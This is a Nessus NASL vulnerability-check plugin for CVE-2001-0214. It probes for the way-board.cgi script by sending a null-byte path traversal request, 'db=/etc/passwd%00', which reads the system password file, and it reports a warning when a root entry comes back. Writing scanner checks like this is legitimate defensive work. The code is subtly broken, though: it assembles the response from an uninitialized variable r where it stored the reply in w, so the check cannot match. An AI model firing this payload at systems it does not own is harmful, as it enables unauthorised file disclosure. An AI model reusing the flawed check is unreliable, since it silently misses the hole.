#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10610);
  script_version ("$Revision: 1.21 $");
  script_cve_id("CVE-2001-0214");
  script_bugtraq_id(2370);
  script_xref(name:"OSVDB", value:"506");

  script_name(english:"Way-board way-board.cgi db Parameter Arbitrary File Access");
  script_summary(english:"Checks for the presence of /cgi-bin/way-board");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote CGI script is vulnerable to information disclosure.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The 'way-board' CGI is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody)."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Remove the 'way-board' CGI script."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/2001-02/0212.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N'
  );

  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

function check(url)
{
 local_var r, w;
 w = http_send_recv3(method:"GET", port:port,
   item:string(url, "/way-board/way-board.cgi?db=/etc/passwd%00"));
 if (isnull(w)) exit(0);
 r = strcat(r[0], r[1], '\r\n', r[2]);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
 {
  security_warning(port);
  exit(0);
 }
 return(0);
}


check(url:"");
foreach dir (cgi_dirs())
{
 check(url:dir);
}
